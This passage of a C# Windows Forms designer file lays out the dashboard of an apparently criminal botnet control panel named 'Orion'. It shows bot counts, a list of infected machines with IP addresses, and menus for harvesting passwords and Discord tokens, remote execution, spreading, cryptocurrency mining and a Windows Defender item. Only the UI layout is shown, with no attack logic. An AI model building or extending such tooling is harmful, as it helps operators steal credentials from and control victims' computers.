            this.Menu8.IconVisible = true;
            this.Menu8.IconZoom = 50D;
            this.Menu8.IsTab = false;
            this.Menu8.Location = new System.Drawing.Point(0, 315);
            this.Menu8.Margin = new System.Windows.Forms.Padding(0);
            this.Menu8.Name = "Menu8";
            this.Menu8.Normalcolor = System.Drawing.Color.Transparent;
            this.Menu8.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.Menu8.OnHoverTextColor = System.Drawing.Color.White;
            this.Menu8.selected = false;
            this.Menu8.Size = new System.Drawing.Size(182, 45);
            this.Menu8.TabIndex = 7;
            this.Menu8.Text = "   About";
            this.Menu8.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Menu8.Textcolor = System.Drawing.Color.White;
            this.Menu8.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Menu8.Click += new System.EventHandler(this.SomeMenu_Click);
            // 
            // TopPanel
            // 
            this.TopPanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(118)))), ((int)(((byte)(210)))));
            this.TopPanel.Controls.Add(this.MinimizeButton);
            this.TopPanel.Controls.Add(this.CloseButton);
            this.TopPanel.Controls.Add(this.TitleLabel);
            this.TopPanel.Dock = System.Windows.Forms.DockStyle.Top;
            this.TopPanel.Location = new System.Drawing.Point(0, 0);
            this.TopPanel.Name = "TopPanel";
            this.TopPanel.Size = new System.Drawing.Size(801, 45);
            this.TopPanel.TabIndex = 2;
            // 
            // MinimizeButton
            // 
            this.MinimizeButton.BackColor = System.Drawing.Color.Transparent;
            this.MinimizeButton.color = System.Drawing.Color.Transparent;
            this.MinimizeButton.colorActive = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.MinimizeButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.MinimizeButton.Font = new System.Drawing.Font("Century Gothic", 15.75F);
            this.MinimizeButton.ForeColor = System.Drawing.Color.White;
            this.MinimizeButton.Image = ((System.Drawing.Image)(resources.GetObject("MinimizeButton.Image")));
            this.MinimizeButton.ImagePosition = 2;
            this.MinimizeButton.ImageZoom = 44;
            this.MinimizeButton.LabelPosition = 0;
            this.MinimizeButton.LabelText = "";
            this.MinimizeButton.Location = new System.Drawing.Point(731, 0);
            this.MinimizeButton.Margin = new System.Windows.Forms.Padding(6);
            this.MinimizeButton.Name = "MinimizeButton";
            this.MinimizeButton.Size = new System.Drawing.Size(35, 20);
            this.MinimizeButton.TabIndex = 2;
            this.MinimizeButton.Click += new System.EventHandler(this.MinimizeButton_Click);
            // 
            // CloseButton
            // 
            this.CloseButton.BackColor = System.Drawing.Color.Transparent;
            this.CloseButton.color = System.Drawing.Color.Transparent;
            this.CloseButton.colorActive = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.CloseButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.CloseButton.Font = new System.Drawing.Font("Century Gothic", 15.75F);
            this.CloseButton.ForeColor = System.Drawing.Color.White;
            this.CloseButton.Image = ((System.Drawing.Image)(resources.GetObject("CloseButton.Image")));
            this.CloseButton.ImagePosition = 1;
            this.CloseButton.ImageZoom = 50;
            this.CloseButton.LabelPosition = 0;
            this.CloseButton.LabelText = "";
            this.CloseButton.Location = new System.Drawing.Point(766, 0);
            this.CloseButton.Margin = new System.Windows.Forms.Padding(6);
            this.CloseButton.Name = "CloseButton";
            this.CloseButton.Size = new System.Drawing.Size(35, 20);
            this.CloseButton.TabIndex = 1;
            this.CloseButton.Click += new System.EventHandler(this.CloseButton_Click);
            // 
            // TitleLabel
            // 
            this.TitleLabel.AutoSize = true;
            this.TitleLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F);
            this.TitleLabel.ForeColor = System.Drawing.Color.White;
            this.TitleLabel.Location = new System.Drawing.Point(12, 11);
            this.TitleLabel.Name = "TitleLabel";
            this.TitleLabel.Size = new System.Drawing.Size(57, 24);
            this.TitleLabel.TabIndex = 0;
            this.TitleLabel.Text = "Orion";
            // 
            // PageControl
            // 
            this.PageControl.Controls.Add(this.Page1);
            this.PageControl.Controls.Add(this.Page2);
            this.PageControl.Controls.Add(this.Page3);
            this.PageControl.Controls.Add(this.Page4);
            this.PageControl.Controls.Add(this.Page5);
            this.PageControl.Controls.Add(this.Page6);
            this.PageControl.Controls.Add(this.Page7);
            this.PageControl.Controls.Add(this.Page8);
            this.PageControl.ItemSize = new System.Drawing.Size(58, 1);
            this.PageControl.Location = new System.Drawing.Point(178, 40);
            this.PageControl.Name = "PageControl";
            this.PageControl.SelectedIndex = 0;
            this.PageControl.Size = new System.Drawing.Size(631, 460);
            this.PageControl.TabIndex = 3;
            // 
            // Page1
            // 
            this.Page1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page1.Controls.Add(this.StatCard2);
            this.Page1.Controls.Add(this.StatCard1);
            this.Page1.Controls.Add(this.activityChart);
            this.Page1.Location = new System.Drawing.Point(4, 5);
            this.Page1.Name = "Page1";
            this.Page1.Padding = new System.Windows.Forms.Padding(3);
            this.Page1.Size = new System.Drawing.Size(623, 451);
            this.Page1.TabIndex = 0;
            this.Page1.Text = "tabPage1";
            // 
            // StatCard2
            // 
            this.StatCard2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.StatCard2.BorderRadius = 5;
            this.StatCard2.BottomSahddow = false;
            this.StatCard2.color = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.StatCard2.Controls.Add(this.uptimeLabel);
            this.StatCard2.Controls.Add(this.miningLabel);
            this.StatCard2.Controls.Add(this.usersLabel);
            this.StatCard2.Controls.Add(this.offlineLabel);
            this.StatCard2.Controls.Add(this.onlineLabel);
            this.StatCard2.Controls.Add(this.botsLabel);
            this.StatCard2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StatCard2.ForeColor = System.Drawing.Color.White;
            this.StatCard2.LeftSahddow = false;
            this.StatCard2.Location = new System.Drawing.Point(313, 254);
            this.StatCard2.Name = "StatCard2";
            this.StatCard2.RightSahddow = false;
            this.StatCard2.ShadowDepth = 20;
            this.StatCard2.Size = new System.Drawing.Size(282, 156);
            this.StatCard2.TabIndex = 3;
            // 
            // uptimeLabel
            // 
            this.uptimeLabel.AutoSize = true;
            this.uptimeLabel.Location = new System.Drawing.Point(21, 91);
            this.uptimeLabel.Name = "uptimeLabel";
            this.uptimeLabel.Size = new System.Drawing.Size(140, 15);
            this.uptimeLabel.TabIndex = 6;
            this.uptimeLabel.Text = "Server uptime: 0h 1m 0s";
            // 
            // miningLabel
            // 
            this.miningLabel.ActiveLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.miningLabel.AutoSize = true;
            this.miningLabel.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(118)))), ((int)(((byte)(210)))));
            this.miningLabel.Location = new System.Drawing.Point(21, 116);
            this.miningLabel.Name = "miningLabel";
            this.miningLabel.Size = new System.Drawing.Size(94, 15);
            this.miningLabel.TabIndex = 5;
            this.miningLabel.TabStop = true;
            this.miningLabel.Text = "Mining statistics";
            this.miningLabel.VisitedLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(118)))), ((int)(((byte)(210)))));
            this.miningLabel.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.MiningLabel_LinkClicked);
            // 
            // usersLabel
            // 
            this.usersLabel.AutoSize = true;
            this.usersLabel.Location = new System.Drawing.Point(21, 63);
            this.usersLabel.Name = "usersLabel";
            this.usersLabel.Size = new System.Drawing.Size(111, 15);
            this.usersLabel.TabIndex = 4;
            this.usersLabel.Text = "Number of users: 1";
            // 
            // offlineLabel
            // 
            this.offlineLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(60)))), ((int)(((byte)(0)))));
            this.offlineLabel.Location = new System.Drawing.Point(211, 31);
            this.offlineLabel.Name = "offlineLabel";
            this.offlineLabel.Size = new System.Drawing.Size(42, 23);
            this.offlineLabel.TabIndex = 3;
            this.offlineLabel.Text = "9999";
            this.offlineLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // onlineLabel
            // 
            this.onlineLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(77)))), ((int)(((byte)(230)))), ((int)(((byte)(0)))));
            this.onlineLabel.Location = new System.Drawing.Point(163, 31);
            this.onlineLabel.Name = "onlineLabel";
            this.onlineLabel.Size = new System.Drawing.Size(42, 23);
            this.onlineLabel.TabIndex = 2;
            this.onlineLabel.Text = "9999";
            this.onlineLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // botsLabel
            // 
            this.botsLabel.Location = new System.Drawing.Point(21, 31);
            this.botsLabel.Name = "botsLabel";
            this.botsLabel.Size = new System.Drawing.Size(138, 23);
            this.botsLabel.TabIndex = 1;
            this.botsLabel.Text = "Number of bots:    9999";
            this.botsLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // StatCard1
            // 
            this.StatCard1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.StatCard1.BorderRadius = 5;
            this.StatCard1.BottomSahddow = false;
            this.StatCard1.color = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.StatCard1.Controls.Add(this.updateLabel);
            this.StatCard1.Controls.Add(this.networkLabel);
            this.StatCard1.Controls.Add(this.systemLabel);
            this.StatCard1.Controls.Add(this.systemProgressBar);
            this.StatCard1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StatCard1.ForeColor = System.Drawing.Color.White;
            this.StatCard1.LeftSahddow = false;
            this.StatCard1.Location = new System.Drawing.Point(21, 254);
            this.StatCard1.Name = "StatCard1";
            this.StatCard1.RightSahddow = false;
            this.StatCard1.ShadowDepth = 20;
            this.StatCard1.Size = new System.Drawing.Size(282, 156);
            this.StatCard1.TabIndex = 2;
            // 
            // updateLabel
            // 
            this.updateLabel.Location = new System.Drawing.Point(138, 106);
            this.updateLabel.Name = "updateLabel";
            this.updateLabel.Size = new System.Drawing.Size(120, 15);
            this.updateLabel.TabIndex = 4;
            this.updateLabel.Text = "10/21/2019 19:22";
            this.updateLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // networkLabel
            // 
            this.networkLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(132)))), ((int)(((byte)(0)))));
            this.networkLabel.Location = new System.Drawing.Point(143, 63);
            this.networkLabel.Name = "networkLabel";
            this.networkLabel.Size = new System.Drawing.Size(111, 30);
            this.networkLabel.TabIndex = 3;
            this.networkLabel.Text = "Network availability\r\nAverage";
            this.networkLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // systemLabel
            // 
            this.systemLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.systemLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(77)))), ((int)(((byte)(230)))), ((int)(((byte)(0)))));
            this.systemLabel.Location = new System.Drawing.Point(132, 35);
            this.systemLabel.Name = "systemLabel";
            this.systemLabel.Size = new System.Drawing.Size(132, 15);
            this.systemLabel.TabIndex = 2;
            this.systemLabel.Text = "All systems operational";
            this.systemLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // systemProgressBar
            // 
            this.systemProgressBar.animated = false;
            this.systemProgressBar.animationIterval = 1;
            this.systemProgressBar.animationSpeed = 1;
            this.systemProgressBar.BackColor = System.Drawing.Color.Transparent;
            this.systemProgressBar.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("systemProgressBar.BackgroundImage")));
            this.systemProgressBar.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.systemProgressBar.ForeColor = System.Drawing.Color.White;
            this.systemProgressBar.LabelVisible = false;
            this.systemProgressBar.LineProgressThickness = 8;
            this.systemProgressBar.LineThickness = 5;
            this.systemProgressBar.Location = new System.Drawing.Point(16, 26);
            this.systemProgressBar.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.systemProgressBar.MaxValue = 100;
            this.systemProgressBar.Name = "systemProgressBar";
            this.systemProgressBar.ProgressBackColor = System.Drawing.Color.Black;
            this.systemProgressBar.ProgressColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.systemProgressBar.Size = new System.Drawing.Size(105, 105);
            this.systemProgressBar.TabIndex = 1;
            this.systemProgressBar.Value = 33;
            // 
            // activityChart
            // 
            this.activityChart.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            chartArea1.AxisX.LabelStyle.ForeColor = System.Drawing.Color.White;
            chartArea1.AxisX.LabelStyle.Format = "hh:mm";
            chartArea1.AxisX.LineColor = System.Drawing.Color.White;
            chartArea1.AxisX.MajorGrid.Enabled = false;
            chartArea1.AxisX2.LineColor = System.Drawing.Color.White;
            chartArea1.AxisY.LabelStyle.ForeColor = System.Drawing.Color.White;
            chartArea1.AxisY.LineColor = System.Drawing.Color.White;
            chartArea1.AxisY.MajorGrid.Enabled = false;
            chartArea1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            chartArea1.Name = "ChartArea1";
            this.activityChart.ChartAreas.Add(chartArea1);
            legend1.BackColor = System.Drawing.Color.Transparent;
            legend1.ForeColor = System.Drawing.Color.White;
            legend1.Name = "Legend1";
            this.activityChart.Legends.Add(legend1);
            this.activityChart.Location = new System.Drawing.Point(21, 15);
            this.activityChart.Name = "activityChart";
            series1.ChartArea = "ChartArea1";
            series1.ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.Spline;
            series1.IsXValueIndexed = true;
            series1.Legend = "Legend1";
            series1.Name = "Active Bots";
            series1.XValueType = System.Windows.Forms.DataVisualization.Charting.ChartValueType.DateTime;
            series1.YValueType = System.Windows.Forms.DataVisualization.Charting.ChartValueType.UInt32;
            this.activityChart.Series.Add(series1);
            this.activityChart.Size = new System.Drawing.Size(574, 233);
            this.activityChart.TabIndex = 0;
            this.activityChart.Text = "chart1";
            title1.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            title1.ForeColor = System.Drawing.Color.White;
            title1.Name = "Title1";
            title1.Text = "Activity";
            this.activityChart.Titles.Add(title1);
            // 
            // Page2
            // 
            this.Page2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page2.Controls.Add(this.botGrid);
            this.Page2.Location = new System.Drawing.Point(4, 5);
            this.Page2.Name = "Page2";
            this.Page2.Padding = new System.Windows.Forms.Padding(3);
            this.Page2.Size = new System.Drawing.Size(623, 451);
            this.Page2.TabIndex = 1;
            this.Page2.Text = "tabPage2";
            // 
            // botGrid
            // 
            this.botGrid.AllowUserToAddRows = false;
            this.botGrid.AllowUserToDeleteRows = false;
            this.botGrid.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            dataGridViewCellStyle1.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.White;
            this.botGrid.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.botGrid.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.botGrid.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.botGrid.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(118)))), ((int)(((byte)(210)))));
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.botGrid.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.botGrid.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.botGrid.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.idCol,
            this.checkCol,
            this.statusCol,
            this.nameCol,
            this.ipCol,
            this.compCol,
            this.sysCol});
            this.botGrid.ContextMenuStrip = this.taskMenu;
            this.botGrid.Dock = System.Windows.Forms.DockStyle.Fill;
            this.botGrid.DoubleBuffered = true;
            this.botGrid.EnableHeadersVisualStyles = false;
            this.botGrid.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(118)))), ((int)(((byte)(210)))));
            this.botGrid.HeaderBgColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.botGrid.HeaderForeColor = System.Drawing.Color.White;
            this.botGrid.Location = new System.Drawing.Point(3, 3);
            this.botGrid.MultiSelect = false;
            this.botGrid.Name = "botGrid";
            this.botGrid.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            this.botGrid.RowHeadersVisible = false;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.botGrid.RowsDefaultCellStyle = dataGridViewCellStyle3;
            this.botGrid.RowTemplate.Height = 26;
            this.botGrid.Size = new System.Drawing.Size(617, 445);
            this.botGrid.TabIndex = 0;
            this.botGrid.CellMouseDown += new System.Windows.Forms.DataGridViewCellMouseEventHandler(this.BotGrid_CellMouseDown);
            // 
            // idCol
            // 
            this.idCol.HeaderText = "ID";
            this.idCol.Name = "idCol";
            this.idCol.ReadOnly = true;
            this.idCol.Visible = false;
            // 
            // checkCol
            // 
            this.checkCol.FalseValue = "0";
            this.checkCol.HeaderText = "";
            this.checkCol.IndeterminateValue = "-1";
            this.checkCol.Name = "checkCol";
            this.checkCol.Resizable = System.Windows.Forms.DataGridViewTriState.False;
            this.checkCol.TrueValue = "1";
            this.checkCol.Width = 24;
            // 
            // statusCol
            // 
            this.statusCol.HeaderText = "Status";
            this.statusCol.Name = "statusCol";
            this.statusCol.ReadOnly = true;
            this.statusCol.Width = 50;
            // 
            // nameCol
            // 
            this.nameCol.HeaderText = "Name";
            this.nameCol.Name = "nameCol";
            this.nameCol.ReadOnly = true;
            // 
            // ipCol
            // 
            this.ipCol.HeaderText = "IP Address";
            this.ipCol.Name = "ipCol";
            this.ipCol.ReadOnly = true;
            this.ipCol.Width = 120;
            // 
            // compCol
            // 
            this.compCol.HeaderText = "Computer";
            this.compCol.Name = "compCol";
            this.compCol.ReadOnly = true;
            this.compCol.Width = 120;
            // 
            // sysCol
            // 
            this.sysCol.HeaderText = "System";
            this.sysCol.Name = "sysCol";
            this.sysCol.ReadOnly = true;
            this.sysCol.Width = 200;
            // 
            // taskMenu
            // 
            this.taskMenu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            this.taskMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.doSomethingToolStripMenuItem,
            this.withThisBotToolStripMenuItem,
            this.okToolStripMenuItem,
            this.spreadingToolStripMenuItem,
            this.miscToolStripMenuItem,
            this.cmdAbort});
            this.taskMenu.Name = "taskMenu";
            this.taskMenu.Size = new System.Drawing.Size(150, 136);
            // 
            // doSomethingToolStripMenuItem
            // 
            this.doSomethingToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdBotInfo,
            this.cmdRestart,
            this.cmdBlock,
            this.cmdUpdate,
            this.cmdUninstall});
            this.doSomethingToolStripMenuItem.Name = "doSomethingToolStripMenuItem";
            this.doSomethingToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.doSomethingToolStripMenuItem.Text = "General";
            // 
            // cmdBotInfo
            // 
            this.cmdBotInfo.Name = "cmdBotInfo";
            this.cmdBotInfo.Size = new System.Drawing.Size(114, 22);
            this.cmdBotInfo.Text = "Info";
            this.cmdBotInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdRestart
            // 
            this.cmdRestart.Name = "cmdRestart";
            this.cmdRestart.Size = new System.Drawing.Size(114, 22);
            this.cmdRestart.Text = "Restart";
            this.cmdRestart.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdBlock
            // 
            this.cmdBlock.Name = "cmdBlock";
            this.cmdBlock.Size = new System.Drawing.Size(114, 22);
            this.cmdBlock.Text = "Block";
            this.cmdBlock.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdUpdate
            // 
            this.cmdUpdate.Name = "cmdUpdate";
            this.cmdUpdate.Size = new System.Drawing.Size(114, 22);
            this.cmdUpdate.Text = "Update";
            this.cmdUpdate.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdUninstall
            // 
            this.cmdUninstall.Name = "cmdUninstall";
            this.cmdUninstall.Size = new System.Drawing.Size(114, 22);
            this.cmdUninstall.Text = "Uninstall";
            this.cmdUninstall.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // withThisBotToolStripMenuItem
            // 
            this.withThisBotToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdCompleteInfo,
            this.cmdSysInfo,
            this.cmdSoftInfo,
            this.cmdPassInfo,
            this.cmdDiscordInfo,
            this.filesToolStripMenuItem});
            this.withThisBotToolStripMenuItem.Name = "withThisBotToolStripMenuItem";
            this.withThisBotToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.withThisBotToolStripMenuItem.Text = "Information";
            // 
            // cmdCompleteInfo
            // 
            this.cmdCompleteInfo.Name = "cmdCompleteInfo";
            this.cmdCompleteInfo.Size = new System.Drawing.Size(144, 22);
            this.cmdCompleteInfo.Text = "Complete";
            this.cmdCompleteInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdSysInfo
            // 
            this.cmdSysInfo.Name = "cmdSysInfo";
            this.cmdSysInfo.Size = new System.Drawing.Size(144, 22);
            this.cmdSysInfo.Text = "System";
            this.cmdSysInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdSoftInfo
            // 
            this.cmdSoftInfo.Name = "cmdSoftInfo";
            this.cmdSoftInfo.Size = new System.Drawing.Size(144, 22);
            this.cmdSoftInfo.Text = "Software";
            this.cmdSoftInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdPassInfo
            // 
            this.cmdPassInfo.Name = "cmdPassInfo";
            this.cmdPassInfo.Size = new System.Drawing.Size(144, 22);
            this.cmdPassInfo.Text = "Passwords";
            this.cmdPassInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdDiscordInfo
            // 
            this.cmdDiscordInfo.Name = "cmdDiscordInfo";
            this.cmdDiscordInfo.Size = new System.Drawing.Size(144, 22);
            this.cmdDiscordInfo.Text = "Discord Token";
            this.cmdDiscordInfo.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // filesToolStripMenuItem
            // 
            this.filesToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdDownload,
            this.cmdUpload,
            this.listToolStripMenuItem,
            this.cmdOpen});
            this.filesToolStripMenuItem.Name = "filesToolStripMenuItem";
            this.filesToolStripMenuItem.Size = new System.Drawing.Size(144, 22);
            this.filesToolStripMenuItem.Text = "Files";
            // 
            // cmdDownload
            // 
            this.cmdDownload.Name = "cmdDownload";
            this.cmdDownload.Size = new System.Drawing.Size(122, 22);
            this.cmdDownload.Text = "Download";
            this.cmdDownload.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdUpload
            // 
            this.cmdUpload.Name = "cmdUpload";
            this.cmdUpload.Size = new System.Drawing.Size(122, 22);
            this.cmdUpload.Text = "Upload";
            this.cmdUpload.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // listToolStripMenuItem
            // 
            this.listToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdFolderList,
            this.cmdFileList});
            this.listToolStripMenuItem.Name = "listToolStripMenuItem";
            this.listToolStripMenuItem.Size = new System.Drawing.Size(122, 22);
            this.listToolStripMenuItem.Text = "List";
            // 
            // cmdFolderList
            // 
            this.cmdFolderList.Name = "cmdFolderList";
            this.cmdFolderList.Size = new System.Drawing.Size(108, 22);
            this.cmdFolderList.Text = "Folders";
            this.cmdFolderList.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdFileList
            // 
            this.cmdFileList.Name = "cmdFileList";
            this.cmdFileList.Size = new System.Drawing.Size(108, 22);
            this.cmdFileList.Text = "Files";
            this.cmdFileList.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdOpen
            // 
            this.cmdOpen.Name = "cmdOpen";
            this.cmdOpen.Size = new System.Drawing.Size(122, 22);
            this.cmdOpen.Text = "Open";
            this.cmdOpen.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // okToolStripMenuItem
            // 
            this.okToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.powerToolStripMenuItem,
            this.executeToolStripMenuItem,
            this.miningToolStripMenuItem,
            this.windowsDefenderToolStripMenuItem,
            this.miningToolStripMenuItem1});
            this.okToolStripMenuItem.Name = "okToolStripMenuItem";
            this.okToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.okToolStripMenuItem.Text = "Tasks";
            // 
            // powerToolStripMenuItem
            // 
            this.powerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdShutdown,
            this.cmdReboot,
            this.cmdLock,
            this.cmdSleep,
            this.cmdWake});
            this.powerToolStripMenuItem.Name = "powerToolStripMenuItem";
            this.powerToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.powerToolStripMenuItem.Text = "Power";
            // 
            // cmdShutdown
            // 
            this.cmdShutdown.Name = "cmdShutdown";
            this.cmdShutdown.Size = new System.Drawing.Size(122, 22);
            this.cmdShutdown.Text = "Shutdown";
            this.cmdShutdown.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdReboot
            // 
            this.cmdReboot.Name = "cmdReboot";
            this.cmdReboot.Size = new System.Drawing.Size(122, 22);
            this.cmdReboot.Text = "Reboot";
            this.cmdReboot.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdLock
            // 
            this.cmdLock.Name = "cmdLock";
            this.cmdLock.Size = new System.Drawing.Size(122, 22);
            this.cmdLock.Text = "Lock";
            this.cmdLock.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdSleep
            // 
            this.cmdSleep.Name = "cmdSleep";
            this.cmdSleep.Size = new System.Drawing.Size(122, 22);
            this.cmdSleep.Text = "Sleep";
            this.cmdSleep.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdWake
            // 
            this.cmdWake.Name = "cmdWake";
            this.cmdWake.Size = new System.Drawing.Size(122, 22);
            this.cmdWake.Text = "Wake";
            this.cmdWake.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // executeToolStripMenuItem
            // 
            this.executeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdExec,
            this.cmdRemoteExec,
            this.cmdCommand});
            this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
            this.executeToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.executeToolStripMenuItem.Text = "Execute";
            // 
            // cmdExec
            // 
